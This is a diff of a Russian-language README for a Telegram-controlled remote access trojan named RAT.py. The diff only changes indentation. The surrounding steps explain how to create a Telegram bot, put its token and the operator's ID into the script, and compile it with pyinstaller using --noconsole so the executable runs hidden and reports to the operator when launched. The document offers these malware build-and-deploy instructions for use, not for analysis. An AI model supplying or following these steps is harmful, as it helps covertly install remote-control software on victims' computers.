@@ -15,16 +15,16 @@
 * Если есть ошибка с pyaudio, скачайте [отсюда](https://www.lfd.uci.edu/~gohlke/pythonlibs/#pyaudio)
   * Перейдите в директорию с whl-файлом и впишите в консоль `pip3 install pyaudio.x.x.x.whl`
 * Создаём бота в телеграме у `@BotFather`, после чего находим его API
- <img src="https://i.imgur.com/3eWSJtZ.png">
+  <img src="https://i.imgur.com/3eWSJtZ.png">
 * Теперь вам нужно получить Telegram-ID. Для этого перейдите к `@my_id_bot` и сохраните ваш идентификатор.
- <img src="https://i.imgur.com/TIoauMO.png">
+  <img src="https://i.imgur.com/TIoauMO.png">
 * Теперь впишите скопированный токен и айди в скрипт RAT.py
- <img src="https://i.imgur.com/1T56OZL.png">
+  <img src="https://i.imgur.com/1T56OZL.png">
 * Теперь нажмите CTRL + S, чтобы сохранить изменения.                                                      
 * Чтобы скомпилировать скрипт, воспользуйтесь pyinstaller'ом (`pip install pyinstaller`)
   * Теперь откройте C2MD в директории со скриптом и впишите `pyinstaller --onefile --noconsole RAT.py` и подождите.
   * Скомпилированный `.exe` файл будет в находиться в папке «dist». И при запуске будет отправлять вам подобное сообщение.
- <img src="https://i.imgur.com/CuRuUjn.png">
+  <img src="https://i.imgur.com/CuRuUjn.png">
 
 
 # :rose: Функции:
